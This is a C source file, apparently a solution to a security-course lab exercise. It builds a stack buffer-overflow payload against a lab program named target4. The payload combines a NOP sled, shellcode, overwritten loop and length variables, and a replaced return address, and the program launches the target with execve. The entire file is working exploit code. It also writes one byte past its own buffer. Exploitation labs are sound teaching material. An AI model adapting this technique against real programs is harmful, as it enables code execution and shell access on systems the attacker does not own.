#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

static const int addr = 0x2021fdb0;
static const int NOP = 0x90;

// int i at 172-175, len at 168-171, 
// replace the variables with lower bytes calculated to run loop until arg[187]
// Filling upper bytes with same garbage prevents need for using 'env'
static const int replacei = 0x123456ac;
static const int replacelen = 0x123456bc;

int main(void)
{
	char *args[3];
	char *env[1];

	char buf[188];
	memset((void *)buf, NOP, 180);

	int i;
	int *long_ptr = (int *)buf;
	
	// Set new len
	for (i = 42; i < 43; i++) *(long_ptr + i) = (int)replacelen;
	
	// Set new i
	for (i = 43; i < 44; i++) *(long_ptr + i) = (int)replacei;
	
	// Set new return address in place of foo's return address
	for (i = 44; i < 47; i++) *(long_ptr + i) = (int)addr;
	
	buf[188] = '\0'; // Terminate with NULL

	// Maybe also add shellcode
	int j;
	for (j = 64; j < (64 + strlen(shellcode)); j++) buf[j] = shellcode[j-64];


	args[0] = TARGET; 
	args[1] = (char *)buf; 
	args[2] = NULL;
  
	env[0] = NULL; // Not used

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
